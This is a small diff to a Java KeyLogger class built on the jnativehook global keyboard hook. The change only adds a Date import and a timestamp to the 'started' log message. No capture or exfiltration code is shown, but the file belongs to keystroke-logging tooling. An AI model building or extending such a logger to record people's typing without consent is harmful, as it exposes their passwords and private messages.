@@ -7,6 +7,7 @@ import java.nio.file.Files;
 import java.nio.file.Path;
 import java.nio.file.Paths;
 import java.nio.file.StandardOpenOption;
+import java.util.Date;
 import java.util.logging.Level;
 
 import org.jnativehook.GlobalScreen;
@@ -24,7 +25,7 @@ public class KeyLogger implements NativeKeyListener {
 
     public static void main(String[] args) {
 
-        logger4j.info("Key logger has been started");
+        logger4j.info("Key logger has started " + new Date());
 
         try {
             Path dir = file.getParent();
